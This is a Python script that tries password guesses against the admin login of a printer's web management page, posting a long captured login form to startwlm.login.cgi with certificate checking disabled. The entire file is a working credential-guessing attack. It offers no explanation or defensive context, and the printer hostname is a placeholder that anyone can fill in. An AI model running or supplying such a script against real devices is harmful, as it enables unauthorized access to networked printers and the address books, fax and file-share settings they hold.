#!/usr/bin/python

import requests
#disable certificate warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

attack=['s','!','a','@','m','#','n','$','p','%','c']

headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Referer":"https://<printer hostname>/startwlm/Start_Wlm.htm?arg11=","Cookie":"rtl=0"}

for payload in attack:
        data="failhtmfile=%2Fstartwlm%2FStart_Wlm.htm&okhtmfile=%2Fstartwlm%2FStart_Wlm.htm&func=authLogin&arg03_LoginType=_mode_off&arg04_LoginFrom=_wlm_login&language=https%3A%2F%2Fma.inl.gov%2Fwlmeng%2Findex.htm&hiddRefreshDevice=..%2Fstartwlm%2FHme_DvcSts.htm&hiddRefreshPanelUsed=..%2Fstartwlm%2FHme_PnlUsg.htm&hiddRefreshPaperid=..%2Fstartwlm%2FHme_Paper.htm&hiddRefreshTonerid=..%2Fstartwlm%2FHme_StplPnch.htm&hiddRefreshStapleid=..%2Fstartwlm%2FHme_Toner.htm&hiddnBackNavIndx=1&hiddRefreshDeviceBack=&hiddRefreshPanelUsedBack=&hiddRefreshPaperidBack=&hiddRefreshToneridBack=&hiddRefreshStapleidBack=&hiddCompatibility=&hiddPasswordToOpenChk=&hiddPasswordToOpen=&hiddRePasswordToOpen=&hiddPasswordToEditChk=&hiddPasswordToEdit=&hiddRePasswordToEdit=&hiddPrinting=&hiddChanges=&hiddCopyingOfText=&hiddEmaiSID=&hiddEmaiName=&hiddECM=&hiddDocID=&privid=&publicid=&attrtype=&attrname=&hiddFolderType=&hiddFolderSMBType=&hiddFolderFTPType=&hiddSMBNumber1=&hiddSMBNumber2=&hiddSMBNumber3=&hiddSMBNumber4=&hiddSMBNumber5=&hiddSMBNumber6=&hiddSMBNumber7=&hiddFTPNumber1=&hiddFTPNumber2=&hiddFTPNumber3=&hiddFTPNumber4=&hiddFTPNumber5=&hiddFTPNumber6=&hiddFTPNumber7=&hiddFAXAddress1=&hiddFAXAddress2=&hiddFAXAddress3=&hiddFAXAddress4=&hiddFAXAddress5=&hiddFAXAddress6=&hiddFAXAddress7=&hiddFAXAddress8=&hiddFAXAddress9=&hiddFAXAddress10=&hiddIFaxAdd=&hiddIFaxViaServer=&hiddIFaxConnMode=&hiddIFaxResolution=&hiddIFaxResolution1=&hiddIFaxResolution2=&hiddIFaxResolution3=&hiddIFaxResolution4=&hiddIFaxResolution5=&hiddIFaxComplession=&hiddIFaxPaperSize=&hiddIFaxPaperSize1=&hiddIFaxPaperSize2=&hiddIFaxPaperSize3=&hiddImage=&hiddTest=&hiddDoc_Num=&hiddCopy=&hiddDocument=&hiddDocRec=&AddressNumberPersonal=&AddressNumberGroup=&hiddPersonAddressID=&hiddGroupAddressID=&hiddPrnBasic=&hiddPageName=&hiddDwnLoadType=&hiddPrintType=&hiddSend1=&hiddSend2=&hiddSend3=&hiddSend4=&hiddSend5=&hiddAddrBokBackUrl=&hiddAddrBokNumber=&hiddAddrBokName=&hiddAddrBokFname=&hiddSendFileName=&hiddenAddressbook=&hiddenAddressbook1=&hiddSendDoc_Num=&hiddSendColor=&hiddSendAddInfo=&hiddSendFileFormat=&hiddMoveConfScn=&hiddRefreshDevice=..%2Fstartwlm%2FHme_DvcSts.htm&hiddRefreshPanelUsed=..%2Fstartwlm%2FHme_PnlUsg.htm&hiddRefreshPaperid=..%2Fstartwlm%2FHme_Paper.htm&hiddRefreshTonerid=..%2Fstartwlm%2FHme_StplPnch.htm&hiddRefreshStapleid=..%2Fstartwlm%2FHme_Toner.htm&hiddnBackNavIndx=1&hiddRefreshDeviceBack=&hiddRefreshPanelUsedBack=&hiddRefreshPaperidBack=&hiddRefreshToneridBack=&hiddRefreshStapleidBack=&hiddValue=&arg01_UserName=admin&arg02_Password="+payload+"&arg03_LoginType=_mode_off&arg05_AccountId=&Login=Login&arg06_DomainName=&hndHeight=0"

        print "Sending: "+payload
        a=requests.post("https://<printer hostname>/startwlm.login.cgi",headers=headers,data=data,verify=False)
        print "Response code is: "+str(a.status_code)
